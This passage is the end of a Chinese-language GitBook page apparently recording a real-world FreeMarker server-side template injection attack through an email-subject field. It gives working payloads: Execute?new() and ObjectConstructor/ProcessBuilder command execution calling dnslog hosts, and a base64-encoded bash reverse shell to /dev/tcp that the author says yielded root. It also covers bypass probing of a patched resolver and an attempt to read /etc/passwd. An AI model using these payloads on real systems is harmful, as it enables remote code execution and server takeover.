+        <span class="token comment">// This is usually the case for file output, but not for servlet output.</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220211120737249.png" data-lightbox="d794349e-0dd2-41f4-b681-74081c452fa6" data-title="image-20220211120737249"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220211120737249.png" alt="image-20220211120737249"></a></p>
+<hr>
+<h3 id="&#x4E94;&#x3001;&#x5B9E;&#x6218;&#x53CD;&#x5F39;shell&#x6F14;&#x793A;">&#x4E94;&#x3001;&#x5B9E;&#x6218;&#x53CD;&#x5F39;shell&#x6F14;&#x793A;</h3>
+<h4 id="&#x6D4B;&#x8BD5;&#x662F;&#x5426;&#x51FA;&#x7F51;">&#x6D4B;&#x8BD5;&#x662F;&#x5426;&#x51FA;&#x7F51;</h4>
+<p>&#x4F7F;&#x7528;<code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>freemarker.template.utility.Execute<span class="token punctuation">&quot;</span></span><span class="token attr-name">?new()</span><span class="token punctuation">&gt;</span></span>${value(&quot;ping bf127738.dns.1433.eu.org -c 4&quot;)}</code>&#xFF0C;&#x5728;[&#x90AE;&#x4EF6;&#x4E3B;&#x9898;]&#x5904;&#x8F93;&#x5165;&#x5E76;&#x70B9;&#x51FB;[&#x4FDD;&#x5B58;]&#xFF0C;&#x53D1;&#x73B0;&#x53EF;&#x4EE5;&#x6267;&#x884C;ping&#x547D;&#x4EE4;&#xFF0C;&#x6536;&#x5230;dnslog&#x8BB0;&#x5F55;&#x3002;</p>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220210134520331.png" data-lightbox="30d24bae-7c9a-4981-a78c-08e8c7fa302b" data-title="image-20220210134520331"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220210134520331.png" alt="image-20220210134520331"></a></p>
+<h4 id="&#x6D4B;&#x8BD5;&#x53CD;&#x5F39;shell">&#x6D4B;&#x8BD5;&#x53CD;&#x5F39;Shell</h4>
+<p>&#x8FDB;&#x4E00;&#x6B65;&#x53CD;&#x5F39;shell&#x8FDE;&#x63A5;&#xFF0C;&#x4F7F;&#x7528;<code>bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjEg}|{base64,-d}|{bash,-i}</code>&#x547D;&#x4EE4;&#xFF0C;&#x63D2;&#x5165;&#x5230;payload&#x6267;&#x884C;&#x547D;&#x4EE4;&#x90E8;&#x5206;&#xFF0C;&#x53EF;&#x4EE5;&#x53D6;&#x5F97;&#x670D;&#x52A1;&#x5668;root&#x6743;&#x9650;&#x3002;</p>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220210134620995.png" data-lightbox="dddba141-5585-4d7b-b254-8c63cbbb0c01" data-title="image-20220210134620995"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220210134620995.png" alt="image-20220210134620995"></a></p>
+<p>&#x5173;&#x4E8E;&#x53CD;&#x5F39;shell&#x90E8;&#x5206;&#x53EF;&#x53C2;&#x8003;</p>
+<p><a href="https://www.jianshu.com/p/eb41a0291123" target="_blank">Java Runtime.exe() &#x6267;&#x884C;&#x547D;&#x4EE4;&#x4E0E;&#x53CD;&#x5F39;shell&#xFF08;&#x4E0A;&#xFF09;</a></p>
+<p><a href="https://www.jianshu.com/p/ae3922db1f70" target="_blank">Java Runtime.exe() &#x6267;&#x884C;&#x547D;&#x4EE4;&#x4E0E;&#x53CD;&#x5F39;shell&#xFF08;&#x4E0B;&#xFF09;</a></p>
+<h3 id="&#x590D;&#x6D4B;&#x5C1D;&#x8BD5;&#x7ED5;&#x8FC7;">&#x590D;&#x6D4B;&#x5C1D;&#x8BD5;&#x7ED5;&#x8FC7;</h3>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/v2-df296431a33fa646f63e478c094c27f0_r.jpg" data-lightbox="6bbb79d7-a067-4717-832c-a7125ee6378c" data-title="preview"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/v2-df296431a33fa646f63e478c094c27f0_r.jpg" alt="preview"></a></p>
+<p>&#x6D4B;&#x8BD5;payload</p>
+<pre class="language-"><code class="lang-java">a$<span class="token punctuation">{</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">24</span><span class="token punctuation">}</span>
+<span class="token comment">//&#x8FD4;&#x56DE;a48</span>
+</code></pre>
+<pre class="language-"><code class="lang-java">a<span class="token operator">&lt;</span>#<span class="token keyword">if</span> <span class="token string">&quot;piceous&quot;</span><span class="token operator">?</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">&quot;ice&quot;</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token class-name">It</span> contains <span class="token string">&quot;ice&quot;</span><span class="token operator">&lt;</span><span class="token operator">/</span>#<span class="token keyword">if</span><span class="token operator">&gt;</span>
+<span class="token comment">//&#x5F53;&#x5339;&#x914D;&#x5230;ice&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;aIt contains &quot;ice&quot;,&#x672A;&#x5339;&#x914D;&#x5230;&#x65F6;&#x8FD4;&#x56DE;a</span>
+</code></pre>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220216164653433.png" data-lightbox="223a26e3-e1ca-4e0c-ab38-8ca4d4714982" data-title="image-20220216164653433"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220216164653433.png" alt="image-20220216164653433"></a></p>
+<p>&#x53D1;&#x73B0;&#x652F;&#x6301;&#x63D2;&#x503C;${}&#x548C;&#x6807;&#x7B7E;&lt;#&gt;</p>
+<p>&#x540C;&#x65F6;&#x5728;&#x6807;&#x9898;&#x548C;&#x6B63;&#x6587;&#x5206;&#x5206;&#x522B;&#x4F7F;&#x7528;&#x4E24;&#x4E2A;payload&#x8BD5;&#x8BD5;&#xFF0C;</p>
+<pre class="language-"><code class="lang-java"><span class="token operator">&lt;</span>#list <span class="token punctuation">[</span><span class="token string">&quot;foo&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;bar&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;baz&quot;</span><span class="token punctuation">]</span> as x<span class="token operator">&gt;</span>     $<span class="token punctuation">{</span>x<span class="token punctuation">}</span> <span class="token operator">&lt;</span><span class="token operator">/</span>#list<span class="token operator">&gt;</span>
+
+$<span class="token punctuation">{</span><span class="token string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">&quot;java.lang.ProcessBuilder&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;ping 4374587f.dns.1433.eu.org -c 8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+</code></pre>
+<p>&#x6807;&#x9898;&#x6267;&#x884C;&#x4E86;&#x6807;&#x7B7E;&#xFF0C;&#x6B63;&#x6587;&#x4E0D;&#x80FD;&#x6267;&#x884C;&#x6807;&#x7B7E;</p>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217135245231.png" data-lightbox="87af4956-8fc6-49b5-b4aa-780f343988b8" data-title="image-20220217135245231"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217135245231.png" alt="image-20220217135245231"></a></p>
+<p>&#x6B63;&#x6587;&#x53EA;&#x80FD;&#x6267;&#x884C;&#x63D2;&#x503C;<code>${&quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.lang.ProcessBuilder&quot;,&quot;ping 4374587f.dns.1433.eu.org -c 8&quot;).start()}</code></p>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217135121865.png" data-lightbox="31270208-3119-44d1-8769-8c49d99b76ac" data-title="image-20220217135121865"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217135121865.png" alt="image-20220217135121865"></a></p>
+<p>&#x663E;&#x7136;&#xFF0C;&#x5B83;&#x914D;&#x7F6E;&#x4E86;cfg.setNewBuiltinClassResolver(SAFER_RESOLVER);&#x7528;&#x6765;&#x4FEE;&#x590D;&#x6F0F;&#x6D1E;&#x3002;</p>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217135009748.png" data-lightbox="806ae9e8-897b-4d48-acb7-b21205d9a37e" data-title="image-20220217135009748"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217135009748.png" alt="image-20220217135009748"></a></p>
+<p>&#x518D;&#x4F7F;&#x7528;&#x7279;&#x6B8A;&#x53D8;&#x91CF;&#x67E5;&#x770B;&#x7248;&#x672C;&#x7B49;&#x4FE1;&#x606F;</p>
+<pre class="language-"><code class="lang-java">$<span class="token punctuation">{</span><span class="token punctuation">.</span>version<span class="token punctuation">}</span><span class="token punctuation">,</span>  $<span class="token punctuation">{</span><span class="token punctuation">.</span>output_format<span class="token punctuation">}</span><span class="token punctuation">,</span>  $<span class="token punctuation">{</span><span class="token punctuation">.</span>template_name<span class="token punctuation">}</span> <span class="token punctuation">,</span> $<span class="token punctuation">{</span><span class="token punctuation">.</span>current_template_name<span class="token punctuation">}</span> <span class="token punctuation">,</span> $<span class="token punctuation">{</span><span class="token punctuation">.</span>now<span class="token punctuation">}</span>
+</code></pre>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217141928575.png" data-lightbox="3df87ba0-f1c9-4f21-bb27-98aea89bb433" data-title="image-20220217141928575"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217141928575.png" alt="image-20220217141928575"></a></p>
+<p>&#x770B;&#x770B;&#x80FD;&#x4E0D;&#x80FD;&#x7528;api&#xFF0C;&#x4E00;&#x822C;2.3.22&#x7248;&#x672C;&#x4EE5;&#x540E;&#x9ED8;&#x8BA4;&#x4E0D;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x3002;&#x56E0;&#x4E3A;&#x90AE;&#x4EF6;&#x4E3B;&#x9898;&#x4E0D;&#x80FD;&#x8FD4;&#x56DE;&#x592A;&#x957F;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x80FD;&#x5728;&#x6B63;&#x6587;&#x91CC;&#x8F93;&#x5165;&#xFF1A;</p>
+<pre class="language-"><code>${&quot;object&quot;?api.class.protectionDomain.classLoader}
+</code></pre><p>&#x679C;&#x7136;&#xFF0C;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x3002;</p>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217161256655.png" data-lightbox="7e051f49-7cc3-4145-87c3-62590cc5235a" data-title="image-20220217161256655"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217161256655.png" alt="image-20220217161256655"></a></p>
+<p>&#x6211;&#x4EEC;&#x518D;&#x770B;&#x770B;&#x6807;&#x9898;&#x548C;&#x6B63;&#x6587;&#x7684;&#x8054;&#x7CFB;&#xFF0C;&#x7528;&#x4E00;&#x4E2A;&#x8BFB;&#x6587;&#x4EF6;&#x8BD5;&#x8BD5;</p>
+<pre class="language-"><code class="lang-java"><span class="token operator">&lt;</span>#assign aaa<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>#include <span class="token punctuation">.</span>current_template_name parse<span class="token operator">=</span><span class="token boolean">false</span><span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>#assign<span class="token operator">&gt;</span>$<span class="token punctuation">{</span>aaa<span class="token punctuation">}</span>
+</code></pre>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217170721457.png" data-lightbox="e9854a3c-c9bc-4c6b-b690-851b6827ae08" data-title="image-20220217170721457"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217170721457.png" alt="image-20220217170721457"></a></p>
+<p>&#x8FD4;&#x56DE;&#x503C;&#x8BF4;&#x660E;&#x8BFB;&#x5230;&#x4E86;&#x5F53;&#x524D;&#x7684;&#x6A21;&#x677F;&#x6587;&#x4EF6;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5305;&#x542B;&#x90AE;&#x4EF6;&#x6B63;&#x6587;&#x7684;<code>${version}</code>&#xFF0C;&#x5C5E;&#x4E8E;&#x6BCF;&#x6B21;&#x8C03;&#x7528;&#x90FD;&#x52A8;&#x6001;&#x751F;&#x6210;&#xFF0C;&#x6CA1;&#x6709;&#x8DEF;&#x5F84;&#x3002;&#x6211;&#x731C;&#x60F3;&#x52A8;&#x6001;&#x751F;&#x6210;&#x7684;&#x6A21;&#x677F;&#x6307;&#x9488;&#x662F;&#x5728;jvm&#x91CC;&#xFF0C;&#x53EA;&#x80FD;&#x8BFB;&#x5185;&#x5B58;&#x7684;&#x4E1C;&#x897F;&#x3002;&#x6CA1;&#x6CD5;&#x8C03;&#x7528;&#x7CFB;&#x7EDF;&#x5C42;&#x7684;&#x3002;</p>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217170747874.png" data-lightbox="93c22dfc-959f-467e-b3da-08ab9638f86c" data-title="image-20220217170747874"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217170747874.png" alt="image-20220217170747874"></a></p>
+<p>&#x6211;&#x4EEC;&#x518D;&#x8BD5;&#x8BD5;&#x8BFB;&#x6587;&#x4EF6;</p>
+<pre class="language-"><code class="lang-java"><span class="token operator">&lt;</span>#assign optTemp <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token function">get_optional_template</span><span class="token punctuation">(</span>&apos;<span class="token operator">/</span>etc<span class="token operator">/</span>passwd&apos;<span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>#<span class="token keyword">if</span> optTemp<span class="token punctuation">.</span>exists<span class="token operator">&gt;</span>
+    <span class="token class-name">Template</span> was found<span class="token punctuation">.</span>
+<span class="token operator">&lt;</span>#<span class="token keyword">else</span><span class="token operator">&gt;</span>
+    <span class="token class-name">Template</span> was missing<span class="token punctuation">.</span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>#<span class="token keyword">if</span><span class="token operator">&gt;</span>
+</code></pre>
+<p>&#x6CA1;&#x6709;&#x6587;&#x4EF6;&#xFF0C;&#x9EBB;&#x4E86;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x5728;jvm&#x91CC;&#x3002;</p>
+<p><a href="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217171034947.png" data-lightbox="a604f906-3dc0-408b-9d78-2c2921f859b1" data-title="image-20220217171034947"><img src="FreeMarker&#x6A21;&#x677F;&#x6CE8;&#x5165;&#x5B9E;&#x4F8B;.assets/image-20220217171034947.png" alt="image-20220217171034947"></a> </p>
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; R4ph4e1 2023 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2023-12-24 18:28:13
+</span></footer>
+                        
+                    </section>
+                    
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+        
+        
+        
+    </div>
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"FreeMarker模板注入实例","level":"1.3.1.2","depth":3,"next":{"title":"Shiro实战","level":"1.3.2","depth":2,"ref":"","articles":[{"title":"JEECMS的Shiro C3P0链.Assets","level":"1.3.2.1","depth":3,"ref":"","articles":[]},{"title":"JEECMS的Shiro C3P0链","level":"1.3.2.2","depth":3,"path":"markdown/实战记录/Shiro实战/JEECMS的Shiro-C3P0链.md","ref":"markdown/实战记录/Shiro实战/JEECMS的Shiro-C3P0链.md","articles":[]},{"title":"再战JEECMS Shiro.Assets","level":"1.3.2.3","depth":3,"ref":"","articles":[]},{"title":"再战JEECMS Shiro的小技巧","level":"1.3.2.4","depth":3,"path":"markdown/实战记录/Shiro实战/再战JEECMS-shiro的小技巧.md","ref":"markdown/实战记录/Shiro实战/再战JEECMS-shiro的小技巧.md","articles":[]},{"title":"记一次Shiro爆杀阿里云WAF.Assets","level":"1.3.2.5","depth":3,"ref":"","articles":[]},{"title":"记一次Shiro爆杀阿里云WAF","level":"1.3.2.6","depth":3,"path":"markdown/实战记录/Shiro实战/记一次shiro爆杀阿里云WAF.md","ref":"markdown/实战记录/Shiro实战/记一次shiro爆杀阿里云WAF.md","articles":[]}]},"previous":{"title":"FreeMarker模板注入实例.Assets","level":"1.3.1.1","depth":3,"ref":"","articles":[]},"dir":"ltr"},"config":{"plugins":["splitter","hide-element","code","theme-d4t","-lunr","-search","-sharing","search-pro-fixed","-highlight","chapter-fold","expandable-chapters","lightbox","donate","tbfed-pagefooter","github","flexible-alerts","prism","back-to-top-button","auto-scroll-table","summary"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"theme-d4t":{},"tbfed-pagefooter":{"copyright":"Copyright &copy R4ph4e1 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript","shell":"bash"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"github":{"url":"https://github.com/R4ph4e1-0x01"},"d4t":{"search-placeholder":"请输入关键字搜索","logo":"/README.assets/logo.svg","favicon":"/README.assets/favicon.ico"},"summary":{},"splitter":{},"auto-scroll-table":{},"code":{"copyButtons":true},"search-pro-fixed":{},"donate":{"alipay":"/README.assets/gzh_1.png","alipayText":"点点广告🙏","button":"支持作者","title":"","wechat":"/README.assets/gzh_0.png","wechatText":"关闭Adblock"},"hide-element":{"elements":[".gitbook-link",".title",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"lightbox":{"jquery":true,"sameUuid":false},"back-to-top-button":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"R4ph4e1","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{"d4t":{"nav":[]}},"title":"R4ph4e1 的知识库","gitbook":"*","description":"工作许久，发现“好记性不如烂笔头”太有道理。但各种经验和想法都记录下来之后还需提炼回顾，故新开此博客。","theme-default":{"showLevel":true}},"file":{"path":"markdown/实战记录/SSTI实战/FreeMarker模板注入实例.md","mtime":"2023-12-24T18:28:13.268Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-12-24T19:54:27.835Z"},"basePath":"../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../gitbook/gitbook.js"></script>
+    <script src="../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro-fixed/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro-fixed/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-theme-d4t/script.js"></script>
+        
+    
+
+    </body>
+</html>
+
